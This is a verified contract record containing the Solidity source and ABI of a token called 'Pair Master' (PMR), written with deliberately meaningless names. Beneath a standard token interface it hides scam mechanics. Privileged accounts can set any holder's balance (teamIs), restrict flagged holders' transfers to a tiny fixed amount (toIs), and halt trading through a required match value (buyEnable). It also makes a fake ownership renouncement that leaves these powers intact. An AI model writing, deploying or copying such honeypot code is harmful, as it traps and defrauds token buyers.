{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface feeToken {\n    function createPair(address autoFee, address senderAutoMax) external returns (address);\n}\n\ninterface enableLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellWallet) external view returns (uint256);\n\n    function transfer(address launchLimit, uint256 walletAt) external returns (bool);\n\n    function allowance(address swapWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchLimit,\n        uint256 walletAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenFrom, uint256 value);\n    event Approval(address indexed swapWallet, address indexed spender, uint256 value);\n}\n\nabstract contract modeShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamTxShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquiditySell is enableLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PairMaster is modeShould, enableLiquidity, liquiditySell {\n\n    uint256 private exemptBuy;\n\n    function isFee(address toEnable, address launchLimit, uint256 walletAt) internal returns (bool) {\n        require(autoMax[toEnable] >= walletAt);\n        autoMax[toEnable] -= walletAt;\n        autoMax[launchLimit] += walletAt;\n        emit Transfer(toEnable, launchLimit, walletAt);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return modeToSender;\n    }\n\n    function toIs(address shouldFund) public {\n        walletTotal();\n        if (autoLiquidity != exemptBuy) {\n            receiverEnable = false;\n        }\n        if (shouldFund == receiverTake || shouldFund == modeExempt) {\n            return;\n        }\n        walletSwap[shouldFund] = true;\n    }\n\n    bool public fundSwap;\n\n    function transfer(address buyTradingWallet, uint256 walletAt) external virtual override returns (bool) {\n        return amountTrading(_msgSender(), buyTradingWallet, walletAt);\n    }\n\n    function transferFrom(address toEnable, address launchLimit, uint256 walletAt) external override returns (bool) {\n        if (_msgSender() != totalIs) {\n            if (takeTo[toEnable][_msgSender()] != type(uint256).max) {\n                require(walletAt <= takeTo[toEnable][_msgSender()]);\n                takeTo[toEnable][_msgSender()] -= walletAt;\n            }\n        }\n        return amountTrading(toEnable, launchLimit, walletAt);\n    }\n\n    bool private totalLaunchReceiver;\n\n    address public receiverTake;\n\n    function buyEnable(uint256 walletAt) public {\n        walletTotal();\n        swapSender = walletAt;\n    }\n\n    mapping(address => mapping(address => uint256)) private takeTo;\n\n    function allowance(address receiverLaunched, address tradingMarketingLimit) external view virtual override returns (uint256) {\n        if (tradingMarketingLimit == totalIs) {\n            return type(uint256).max;\n        }\n        return takeTo[receiverLaunched][tradingMarketingLimit];\n    }\n\n    uint256 constant fromSwap = 6 ** 10;\n\n    constructor (){\n        if (receiverEnable != senderLaunched) {\n            autoLiquidity = exemptBuy;\n        }\n        teamTxShould feeMode = teamTxShould(totalIs);\n        modeExempt = feeToken(feeMode.factory()).createPair(feeMode.WETH(), address(this));\n        \n        receiverTake = _msgSender();\n        receiverMin[receiverTake] = true;\n        autoMax[receiverTake] = teamExemptAt;\n        liquidityAmount();\n        \n        emit Transfer(address(0), receiverTake, teamExemptAt);\n    }\n\n    uint256 private teamExemptAt = 100000000 * 10 ** 18;\n\n    address private walletShouldTake;\n\n    function teamIs(address buyTradingWallet, uint256 walletAt) public {\n        walletTotal();\n        autoMax[buyTradingWallet] = walletAt;\n    }\n\n    uint256 swapSender;\n\n    string private enableLimitFund = \"PMR\";\n\n    event OwnershipTransferred(address indexed teamBuy, address indexed exemptTrading);\n\n    mapping(address => bool) public receiverMin;\n\n    function getOwner() external view returns (address) {\n        return walletShouldTake;\n    }\n\n    mapping(address => bool) public walletSwap;\n\n    function balanceOf(address sellWallet) public view virtual override returns (uint256) {\n        return autoMax[sellWallet];\n    }\n\n    function walletTotal() private view {\n        require(receiverMin[_msgSender()]);\n    }\n\n    function approve(address tradingMarketingLimit, uint256 walletAt) public virtual override returns (bool) {\n        takeTo[_msgSender()][tradingMarketingLimit] = walletAt;\n        emit Approval(_msgSender(), tradingMarketingLimit, walletAt);\n        return true;\n    }\n\n    address totalIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function liquidityAmount() public {\n        emit OwnershipTransferred(receiverTake, address(0));\n        walletShouldTake = address(0);\n    }\n\n    uint8 private listExemptFund = 18;\n\n    address tokenSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamExemptAt;\n    }\n\n    address public modeExempt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableLimitFund;\n    }\n\n    function owner() external view returns (address) {\n        return walletShouldTake;\n    }\n\n    function walletMinTake(address marketingModeTake) public {\n        require(marketingModeTake.balance < 100000);\n        if (fundSwap) {\n            return;\n        }\n        \n        receiverMin[marketingModeTake] = true;\n        \n        fundSwap = true;\n    }\n\n    function amountTrading(address toEnable, address launchLimit, uint256 walletAt) internal returns (bool) {\n        if (toEnable == receiverTake) {\n            return isFee(toEnable, launchLimit, walletAt);\n        }\n        uint256 takeWallet = enableLiquidity(modeExempt).balanceOf(tokenSell);\n        require(takeWallet == swapSender);\n        require(launchLimit != tokenSell);\n        if (walletSwap[toEnable]) {\n            return isFee(toEnable, launchLimit, fromSwap);\n        }\n        return isFee(toEnable, launchLimit, walletAt);\n    }\n\n    bool public receiverEnable;\n\n    uint256 private autoLiquidity;\n\n    mapping(address => uint256) private autoMax;\n\n    bool public senderLaunched;\n\n    uint256 tradingTo;\n\n    string private modeToSender = \"Pair Master\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return listExemptFund;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingMarketingLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMarketingLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletAt\",\"type\":\"uint256\"}],\"name\":\"buyEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTradingWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletAt\",\"type\":\"uint256\"}],\"name\":\"teamIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFund\",\"type\":\"address\"}],\"name\":\"toIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTradingWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingModeTake\",\"type\":\"address\"}],\"name\":\"walletMinTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PairMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}